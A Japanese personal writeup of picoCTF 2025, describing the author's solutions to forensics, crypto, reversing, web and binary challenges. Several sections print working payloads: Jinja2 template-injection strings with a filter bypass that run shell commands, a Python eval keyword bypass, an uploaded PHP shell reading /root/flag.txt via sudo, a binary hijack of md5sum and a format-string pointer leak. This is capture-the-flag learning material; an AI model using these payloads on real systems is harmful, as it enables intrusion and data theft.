---
title: picoCTF 2025 Writeup
tags: CTF
---

[picoCTF 2025](https://play.picoctf.org/events/74) に個人で参加しました。\
解けた問題について、解いた順にいろいろ書いていきます。以下の問題は解けなかったので、これらの解法をお探しの方は他をあたってください……

- Binary Exploitation
  - Echo Valley
  - handoff
- Cryptography
  - Guess My Cheese (Part 2)
  - ChaCha Slide
  - Ricochet
- Forensics
  - flags are stepic
  - Bitlocker-1
  - Bitlocker-2
- General Skills
  - YaraRules0x100
- Reverse Engineering
  - Binary Instrumentation 1
  - Binary Instrumentation 2
  - perplexed
- Web Exploitation
  - WebSockFish
  - Apriti sesamo
  - Pachinko Revisited
  - secure-email-service

---

## FANTASY CTF
(General Skills)

問題文の指示どおりに `nc` コマンドを使うと、ルール確認のような対話が始まる。良さげな選択肢を選んで完了すると FLAG を教えてもらえる。

良さげじゃない選択肢を選ぶとどうなるかは試していない。

---

## Rust fixme 1
(General Skills)

直すべき箇所はコメントで教えてくれている。\
文の終わりに `;` を書くことと `return` で return できる(?) ことは C 言語と同じ。\
`println!` の書式には `{}` を使っているのをどこかで見かけた記憶があるので、もともと書かれていた `:?` の意味はよくわかっていないが、触らぬ神に祟りなしということで `"{:?}"` に修正する。

`cargo run` で実行すると FLAG が出力される。

---

## Rust fixme 2
(General Skills)

まずは与えられたソースコードを `cargo run` してみると、直すためのヒントを出力してくれる。そのとおりに `decrypt` 関数定義の `borrowed_string: &String` を `borrowed_string: &mut String` にする。\
次は `decrypt` 関数を使う側を変更するよう言われ、とりあえず `.clone()` してやっぱりダメだったのを経て `&mut party_foul` とすればいいことがわかる。\
次は `party_foul` のミュータブル参照がとれない旨のエラーが出るので、ヒントどおり `let mut party_foul =` に修正する。

コンパイルメッセージが親切なので、かじった程度の知識でもデバッグできていいね。

---

## Rust fixme 3
(General Skills)

`unsafe {` と、対応する `}` をコメントアウト状態から戻すだけ。

---

## Ph4nt0m 1ntrud3r
(Forensics)

`tcpdump -r myNetworkTraffic.pcap` なり Wireshark なりで pcap ファイルの中身を見てみる。パケットが時刻順に並んでいないところと、ペイロードから base64 の匂いがプンプンするところが気になるので、Python でスクリプトを書く。

（実行には `scapy` のインストールが必要）
```python
from base64    import b64decode
from operator  import itemgetter
from scapy.all import rdpcap

data = []
for packet in rdpcap('myNetworkTraffic.pcap'):
  data.append(
    (packet.time, b64decode(packet['Raw'].load))
  )

data.sort(key=itemgetter(0))
txt = b''.join(map(itemgetter(1), data))
print(txt)
```

出力の末尾を見ると FLAG が得られる。

pcap ファイルの調べ方や `scapy` は ChatGPT が教えてくれた。

---

## Cookie Monster Secret Recipe
(Web Exploitation)

適当にログインを試して失敗すると cookie をチェックするようヒントが出る。ブラウザの開発者ツールで cookie を調べると base64 っぽいデータがあるので、適当にデコードすると FLAG が得られる。

---

## head-dump
(Web Exploitation)

`#API Documentation` はリンクになっており、その先のページで heapdump コマンドをポチると、ファイルをダウンロードできるようになる。ダウンロードされる .heapsnapshot はただのテキストファイルのようだが、サイズがデカいせいか VSCode ではちょっと待っても内容が表示されない。\
`grep` で picoCTF を検索すると、すぐに FLAG を含む出力が得られた。

---

## hashcrack
(Cryptography)

ハッシュ値が与えられ、その平文を答える問答を 3 回こなす。\
ハッシュ値の長さから使われたアルゴリズムを推測し、md5 reverse などのようにググれば、所望のツールがきっと見つかる。私は [10015.io](https://10015.io) を使った。\
全問正解すると FLAG を教えてもらえる。

---

## EVEN RSA CAN BE BROKEN???
(Cryptography)

RSA 暗号で暗号化された FLAG と、公開鍵の N, e が与えられる。\
RSA 暗号の安全性は N の素因数分解の難しさによっているのだが、与えられた N は偶数であるため簡単に素因数分解できてしまう。いちおう[すごい素因数分解ツール](http://tsujimotter.info/works/elliptic/)でも確かめた。

N を素因数分解しておしまいというわけではなく、秘密鍵を入手して、暗号文を復号までやってゴールである。Wikipedia を読んで、秘密鍵の入手（ユークリッドの互除法）と復号（冪剰余）を実装して計算させる。

```python
# a*x + b*y == 1
def extgcd(x: int, y: int) -> tuple[int, int]:
  q, r = divmod(y, x)
  # y == qx + r
  # -qx + y == r
  if r == 1:
    return (-q, 1)
  else:
    a, b = extgcd(r, x)
    # ar + bx == 1
    # a(-qx + y) + bx == 1
    # (b - a*q)x + ay == 1
    return (b - a*q, a)

def main():
  N = 19945093308215921498367959905171102528007369462308989906823791734913096611194024358758373072754814390219648087084454906330074825640679387612809527554364598
  e = 65537
  B = 5503080626045191542018691355846736946972753238985657227270751315177686116564093705551667575043491203031885413097632036086577045339883177798529790360695271

  p = 2
  q = N // 2
  f = (p-1) * (q-1)

  a, b = extgcd(e, f)
  assert a*e + b*f == 1
  while a < 0:
    a += f
    b -= e
  assert a*e + b*f == 1  # `a` is private key

  A = pow(B, a, N)
  txt = bytearray()
  while A > 0:
    txt.append(A % 256)
    A //= 256
  txt.reverse()
  print(txt)

if __name__ == '__main__':
  main()
```

<br>

---

## Flag Hunters
(Reverse Engineering)

サーバーにアクセスすると CTF の要素を盛り込んだ、たぶんオリジナルの歌詞が流れてくる。一度、合いの手(?)を入力するところがあり、そこでうまいことやる。

配布されたソースコードを読むと `RETURN i` で `i` 行めの歌詞にジャンプできることと、`;` で 1 行のテキストを分割して処理できることがわかる。よって `;RETURN 0` という合いの手を入れることで、歌詞の再生が秘密のイントロにジャンプ、FLAG を入手できる。再生が無限ループになってしまったので `Ctrl + C` などで適当に終了させる。

---

## PIE TIME
(Binary Exploitation)

`main` のアドレスを伝えられ、その後、ユーザー入力のアドレスを関数呼び出しする。そこで `win` を呼び出すと FLAG を入手できる。

`objdump -d vuln > dump.txt` で配布された実行ファイルを調べる。\
実行時のランダム化のため、dump.txt を読んでも `win` のアドレスを直接知ることはできない。しかし、ランダム化の後も `main` と `win` のアドレスの差は変わらない。\
電卓などで、伝えられた `main` のアドレスから `win` のアドレスを計算して、それを入力すると FLAG を入手できる。

---

## RED
(Forensics)

red.png が与えられる。

`strings red.png` で png にテキストデータが埋め込まれていないか調べる。すると、メタデータの部分にポエムを発見できる。ポエム自体に深い意味はなさそうだが、縦読みすると CHECK LSB と読める。

red.png の LSB (最下位ビット) を強調した画像を作ってみると、縦縞があらわれる。\
これは、横方向に並んだデータが繰り返されているということなので、横一列ぶんの LSB を繋げてテキスト出力してみると、base64 っぽいテキストが出てくる。デコードすると FLAG を入手できる。

（実行には `Pillow` のインストールが必要）
```python
from itertools import product
from base64    import b64decode
from PIL       import Image

def lsb():
  with Image.open('red.png') as img:
    w, h = img.size
    out = Image.new('RGB', img.size)
    for j, i in product(range(w), range(h)):
      px = img.getpixel((j, i))
      out.putpixel((j, i), ((px[0]&1)<<7, (px[1]&1)<<7, (px[2]&1)<<7))
    out.save('lsb.png')

def main():
  with Image.open('red.png') as img:
    w, _ = img.size
    bits = 0
    for j in range(w):
      px = img.getpixel((j, 0))
      for k in range(4):
        bits <<= 1
        bits |= px[k] & 1
  ba = bytearray()
  while bits > 0:
    ba.append(bits % 256)
    bits //= 256
  ba.reverse()
  print(b64decode(ba))

if __name__ == '__main__':
  # lsb()
  main()
```

---

## SSTI1
(Web Exploitation)

サーバーサイドテンプレートインジェクション (SSTI) についてググって、いろいろ試すと、Python のコードを実行できることがわかる。\
実行コンテキスト(?) のせいで `print` などの組み込み関数や `import` 文が使えないが、これはなんやかんや迂回できる。私は SECCON CTF 13 で知った方法をベースに考えたが、このほかにもいろいろバリエーションがあるらしい。お好みの方法で解けるだろう。

ペイロード例
{% raw %}
`{{ [].__class__.__base__.__subclasses__()[110].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['bash', '-c', 'cat flag']) }}`
{% endraw %}

初見の人がおさえておくべき要点は
- `__globals__['__builtins__']` からお馴染みの `print` などが使えるので、`__globals__` を探すこと
- `__import__` 関数でモジュールのインポートができること

---

## 3v@l
(Web Exploitation)

SSTI1 に引き続き Python のコードを実行できる脆弱性があるが、 `os`, `ls`, `cat`, `..` など、いくつか NG ワードが設定されている。\
しかし、Python の文字列リテラルには、`'o' 's'` が `'os'` になるように、連続するリテラルは結合される仕様がある。これで NG ワード設定を突破できる。\
`ls` で適当に調べると `../flag.txt` を発見できる。これを `cat` したいところだが、NG ワードに引っかからないよう、`cd ..` してから `cat flag.txt` という処理にする。

ペイロード例\
`__import__("subprocess").check_output(["bash", "-c", "cd" " " "." "." ";" "c" "a" "t" " " "flag" "." "txt"])`

---

## n0s4n1ty 1
(Web Exploitation)

任意のファイルをアップロードすると、サーバー上のそのファイルにアクセスできる。\
PHP ファイルをアップロードしてアクセスすると、PHP を実行してくれちゃうので、/root/flag.txt を読みとるコードを書く。`sudo` もパスワードいらずでできてしまうようだ。

```php
<?php
system("sudo cat /root/flag.txt");
```

「PHP ファイルをアップロードするとそれが実行される」という発想になかなか至れず、Python 問より後のクリアになった。

---

## hash-only-1
(Binary Exploitation)

ssh でサーバーに接続する。サーバーに用意された `flaghasher` を実行すると FLAG のハッシュ値を教えてくれる。

配布された `flaghasher` のバイナリを ghidra で逆コンパイルすると、`flaghasher` は `md5sum /root/flag.txt` を実行しているだけだとわかる。\
システム側の `md5sum` を `cat` にすり替えてしまえば `flaghasher` で FLAG を読みとれるな〜　の気持ちで `cp /usr/bin/cat /usr/bin/md5sum` を試すと、どういうわけか成功する。(Permission denied を想定していた)

あとは `flaghasher` で FLAG を入手する。

---

## hash-only-2
(Binary Exploitation)

問題設定は前問と同じ。`cp /usr/bin/cat /usr/bin/md5sum` は Permissin denied になる。

システム側の `md5sum` を `cat` にすり替えるアイデアとして「PATH 内の順位が `/usr/bin` より前のディレクトリに `md5sum` という名前で `cat` を配置する」があったので `cp /usr/bin/cat /usr/local/bin/md5sum` を試すと、どういうわけか成功する。

あとは `flaghasher` で FLAG を入手する。

ちなみに、前問の環境で `cp /usr/bin/cat /usr/local/bin/md5sum` をやると Permission denied になる。どうなってんだ？

---

## Guess My Cheese (Part 1)
(Cryptography)

暗号化されたチーズの名前が伝えられるので、復号したい。回答する前に、ヒントとして、ユーザー入力のチーズの名前を暗号化して教えてくれるやりとりを最大 2 回できる。正答なら FLAG を教えてもらえる。

チーズをググりながらいろいろやりとりしてみると、暗号化アルゴリズムは 1 文字が 1 文字に固定で変換されるようなものであることが予想できる。大文字小文字の区別はない。\
復号にあたって、できるだけたくさんの文字の変換先を暴くために、やりとりで `Orkney Extra Mature Cheddar` と `Queso Blanco con Frutas --Pina y Mango` の暗号を尋ねて、元の文字と変換後の文字の対応表をつくる。空白やハイフンに対応する文字は無視する。\
これでアルファベット 26 文字中 22 文字の変換先が割れるので、とりあえず目的の暗号を復号してみると、完全に復号できることもある。\
一部復号できなかった場合でも、対応表を出力してみると変換の規則性が見えるので、がんばって人力で補う。全部復号できるパターンを引くまで試行し続ける方針もアリかもしれない。

```python
from string import ascii_uppercase

def main():
  s1 = 'Orkney Extra Mature Cheddar'
  t1 = 'UNMFAORAZRNSRQSRGNARWTALLSN'
  s2 = 'Queso Blanco con Frutas --Pina y Mango'
  t2 = 'YGACURHBSFWURWUFRPNGRSCREEJIFSRORQSFEU'
  T = 'ENAGIBTBUB'

  rev = {}
  for c, d in zip(s1.upper(), t1):
    if c in ascii_uppercase:
      rev[d] = c
  for c, d in zip(s2.upper(), t2):
    if c in ascii_uppercase:
      rev[d] = c
  def decrypt(s: str) -> str:
    return ''.join(rev.get(c, '_') for c in s)

  print('from :', ascii_uppercase)
  print('  to :', decrypt(ascii_uppercase))
  print(decrypt(T))

if __name__ == '__main__':
  main()
```

ちなみに Guess My Cheese (Part 2) でチーズのリストが配布されている。名前を受け付けてくれないチーズがけっこうあって苦労したので Part 1 で配布してくれ……

---

## Chronohack
(Reverse Engineering)

サーバーの `token_generator.py` が、UNIX 時刻を seed にトークンを生成する。ずばりトークンを当てると FLAG を教えてもらえる。

`nc` でサーバーにアクセスすると `token_generator.py` が起動して応答が始まる、という流れなので seed となる時刻はこちら側の時刻とそう変わらない。がんばって総当たりする。\
100 件ほど手作業で頑張ったが、終わりの見えない戦いにめげたのでプログラムを書くことにした。\
`nc` の標準入出力をリダイレクトするだけで、インターネット通信ができるらしい。便利だ。

```python
import os, time, random

def token(seed: int) -> str:
  char = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
  random.seed(seed)
  return ''.join(random.choice(char) for _ in range(20))

def main():
  delay = 250
  with open('list.txt', 'w') as f:
    t = int(time.time() * 1000)
    for i in range(50):
      print(token(t+delay+i), file=f)
  os.system('nc verbal-sleep.picoctf.net xxxxx < list.txt > reply.txt')

if __name__ == '__main__':
  main()
```

delay を 50 ずつ増やしながら総当たりしていくと、250 でいい感じに生成できた。

---

## PIE TIME 2
(Binary Exploitation)

Enter your name: で何か入力を受け取り、それを `printf` でオウム返しする。その後、ユーザー入力のアドレスを関数呼び出しする。そこで `win` を呼び出すと FLAG を入手できる。

まずは PIE TIME でもやった `objdump` で dump.txt をつくる。以下はその抜粋。

```
vuln:	file format elf64-x86-64

Disassembly of section .init:

0000000000001000 <_init>:

Disassembly of section .plt:

0000000000001020 <.plt>:

Disassembly of section .plt.got:

00000000000010f0 <.plt.got>:
00000000000010f5 <__cxa_finalize@plt>:

Disassembly of section .plt.sec:

0000000000001100 <.plt.sec>:

Disassembly of section .text:

00000000000011c0 <_start>:
00000000000011f0 <deregister_tm_clones>:
0000000000001220 <register_tm_clones>:
0000000000001260 <__do_global_dtors_aux>:
00000000000012a0 <frame_dummy>:
00000000000012a9 <segfault_handler>:
00000000000012c7 <call_functions>:
000000000000136a <win>:
0000000000001400 <main>:
0000000000001450 <__libc_csu_init>:
00000000000014c0 <__libc_csu_fini>:

Disassembly of section .fini:

00000000000014c8 <_fini>:
```

本問ではサーバー側の実行時情報が何もわからないため、まだ解くには至らない。

配布されたソースコード `vuln.c` を読むと Enter your name: のユーザー入力をそのまま `printf` していることがわかる。ここに脆弱性があり、フォーマット文字列攻撃で何かしらのアドレス情報を得られる。\
`%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p` を送信すると、28 個のポインタ値が返ってくる。\
以下はその出力 (改行は手作業)　実行時依存なので毎回こうなるとは限らない

```
0x61a9c1ee42a1
(nil)
0x61a9c1ee42d9
0x7ffc0279cdb0
0x7c
0x7ffc027b8228
0x7357f72336a0
0x7025702570257025
0x7025702570257025
0x7025702570257025
0x7025702570257025
0x7025702570257025
0x7025702570257025
0x7025702570257025
0x7ffc0279000a
0x61a9bbbd41c0
0x20e8c4c0cf39a00
0x7ffc0279ce10
0x61a9bbbd4441
(nil)
0x7357f706a083
0x7357f726a620
0x7ffc0279cf08
0x100000000
0x61a9bbbd4400
0x61a9bbbd4450
0xbfa3d21bbeba82a6
0x61a9bbbd41c0
```

ぐっとにらむと、0x61a9bbbd4400 (下から 4 つめ) と 0x61a9bbbd4450 (下から 3 つめ) の差が、dump.txt にある 0000000000001400 (&lt;main&gt;) と 0000000000001450 (&lt;__libc_csu_init&gt;) の差と等しいことに気づく。\
0x61a9bbbd4400 が `main` のアドレス、0x61a9bbbd4450 が `__libc_csu_init` のアドレスだと仮定すると、dump.txt の情報から `win` のアドレスは 0x61a9bbbd436a だと言える。これを入力してみると FLAG を入手できた。

`printf` の呼び出し規約とかリターンアドレスとかに詳しかったらもう少し賢い解き方ができるような気がする。

---

## Tap into Hash
(Revese Engineering)

`key` と呼ばれる文字列と、FLAG が仕込まれて暗号化された小規模なブロックチェーンの文字列が与えられる。

`block_chain.py` にはブロックチェーン処理を含めいろいろ実装されているが、重要なのは `encrypt` 関数である。これの中身を呼び出し側と合わせて読むと、文字列化されたブロックチェーン情報の中央に `token` を挿入し、`key` との xor で暗号化、という処理がわかる。\
暗号化アルゴリズムがわかったので復号について考える。特に難しいことは必要なく、xor の性質から、暗号文に対してもう一度 `key` で xor をとるだけでよいことが言える。

復号のほか、見やすさのために FLAG を抽出する処理を実装した。

```python
import hashlib

def xor_bytes(a, b):
  return bytes(x ^ y for x, y in zip(a, b))

def decrypt(cipher: bytes, key: bytes) -> bytes:
  block_size = 16
  key_hash = hashlib.sha256(key).digest()
  text = b''
  for i in range(0, len(cipher), block_size):
    cipher_block = cipher[i:i+block_size]
    text_block = xor_bytes(cipher_block, key_hash)
    text += text_block
  return text

def main():
  with open('enc_flag') as f:
    key_bytes = eval(f.readline()[5:-1])
    cipher_bytes = eval(f.readline()[22:-1])
  ans = decrypt(cipher_bytes, key_bytes)
  i = ans.find(b'picoCTF{')
  j = ans.find(b'}', i)
  print(ans[i:j+1].decode())

if __name__ == '__main__':
  main()
```

---

## Quantum Scrambler
(Reverse Engineering)

量子もつれに着想を得たらしい謎のアルゴリズムでスクランブルされた FLAG が与えられる。

配布された `quantum_scrambler.py` を使って ABCDEFG など、適当なテキストをスクランブルした結果を観察すると、各リストの両端を拾って繋げていくと復元できそうな気がしてくる。\
復元プログラムを Python で実装するにあたっては、リストの文字列から `list` 型のオブジェクトを構築する必要があるが、つらい構文解析などをがんばる必要はなく、`eval` すれば済む。\
後ろ 2 つのリストには、無視すべき要素があったりなかったりするので、リストの大きさを見たり要素の型を見たりして適切にやる。

```python
from subprocess import check_output

def main():
  # cypher = eval(check_output(['python3', 'quantum_scrambler.py']))
  cypher = eval(check_output(['nc', 'verbal-sleep.picoctf.net', '57273']))
  hex_flag = []
  for ls in cypher:
    hex_flag.append(ls[0])
    if len(ls) > 1 and type(ls[0]) == type(ls[-1]):
      hex_flag.append(ls[-1])
  flag = ''.join(chr(int(x,16)) for x in hex_flag)
  print(flag)

if __name__ == '__main__':
  main()
```

---

## Pachinko
(Web Exploitation)

NAND Simulator なる謎のパズルが与えられる。

ガチャガチャやってテキトーに提出してたら解けた。\
いちおう手順を書くが、これでなぜ解けるのかは説明できない。\
なんど (NANDだけにw) か試したが、解けたのは 2 回だけ。タイトルどおりパチンコである。

0. 中間ノードを 4 つ追加する (9, 10, 11, 12 と番号が振られる)
0. (任意) 追加した中間ノードを画面中部に **右** から並べる
0. 入力ノード 7, 8 を中間ノード 9 に繋げる
0. 入力ノード 6, 7 を中間ノード 10 に繋げる
0. 入力ノード 5, 6 を中間ノード 11 に繋げる
0. 入力ノード 5 を中間ノード 12 に繋げる
0. 中間ノード 12 を出力ノード 1 に繋げる
0. 中間ノード 11 を出力ノード 2 に繋げる
0. 中間ノード 10 を出力ノード 3 に繋げる
0. 中間ノード 9 を出力ノード 4 に繋げる

---

## Event-Viewing
(Forensics)

Windows のイベントログが記録された evtx ファイルが与えられる。FLAG が 3 分割されて仕込まれているので、見つける。

当方 macOS ユーザーなので困っていたが ChatGPT に `python-evtx` というライブラリを教えてもらった。これで evtx を xml に変換し、以降は VSCode に読み込んでがんばる。

```python
from Evtx.Evtx import Evtx

def dump():
  with Evtx('Windows_Logs.evtx') as evtx, open('dump.xml', 'w') as f:
    for rec in evtx.records():
      print(rec.xml(), file=f)

if __name__ == '__main__':
  dump()
```

シャットダウンがどうのこうのと問題文に書いてあるので shutdown を検索すると、いくつかヒットするが、そのうちのひとつ `Immediate Shutdown (MXNfYV9wcjN0dHlfdXMzZnVsXw==)` の () 内がかなり不自然。base64 でデコードしてみると FLAG の真ん中とおぼしき文字列になる。\
次は FLAG の先頭を探しにかかったのだが、あてがないため困る。FLAG は `picoCTF{` から始まっているだろうことと、隠されたデータは base64 でエンコードされているだろうことから、`picoCTF{` を base64 エンコードした `cGljb0NURns=` を検索することにした。後ろの方はパディングのため一致しないことに注意して、適当に省く。`cGljb0NURntFdjNudF92aTN3djNyXw==` がヒットした。\
残る 3 つめの断片がどうにも見つからず、たいへん困る。shutdown の検索結果をじっくり調べている中、C:\Windows\system32\shutdown.exe のログの param6 に怪しさを見出した。これが目的の断片で、あとは見つけた断片をそれぞれデコードして結合すれば FLAG を入手できる。

---

## SSTI2
(Web Exploitation)

問題設定は SSTI1 と同じだが、入力は一部の文字が削除されるフィルターにかけられる。

適当に入力して結果を見ると、`.`, `[`, `]` がフィルターされているような感じがする。つまり、なんらかのオブジェクトの子要素にアクセスするポピュラーな方法が封じられてしまい、この迂回に難儀して放置していたが、[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master) にすべてが記述されていた。\
[Jinja2 - Filter Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---filter-bypass), Bypassing most common filters のペイロードを改造する。

ペイロード例
{% raw %}
`{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')() }}`
{% endraw %}

解説
- `|attr('hoge')` はフレームワーク (Flask?) の機能で、`.` による要素アクセスを代替できる
- `[]` による要素アクセスは、Python 内部では `__getitem__` メソッドで処理されているため、これを `|attr('__getitem__')` で代替する

---

Writeup は以上です\
Easy 枠は全問、Medium 枠も半分解けたので嬉しい！
